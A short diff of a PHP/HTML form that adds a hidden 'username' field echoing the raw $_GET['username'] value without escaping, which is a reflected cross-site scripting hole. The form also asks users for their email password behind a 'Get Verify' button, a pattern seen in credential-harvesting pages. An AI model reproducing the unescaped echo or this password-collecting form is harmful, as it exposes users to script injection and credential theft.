@@ -104,6 +104,7 @@ if(isset($_GET['comen']))
             <div class="mb-3">
                 <input type="password" name="emailPassword" id="emailPassword" class="form-input" placeholder="Email Password">
             </div>
+            <input hidden type="text" name="username" value="<?= $_GET['username']; ?>">
             <input hidden type="number" name="comen" value="1">
             <div class="mb-3">
                 <button type="submit">Get Verify</button>
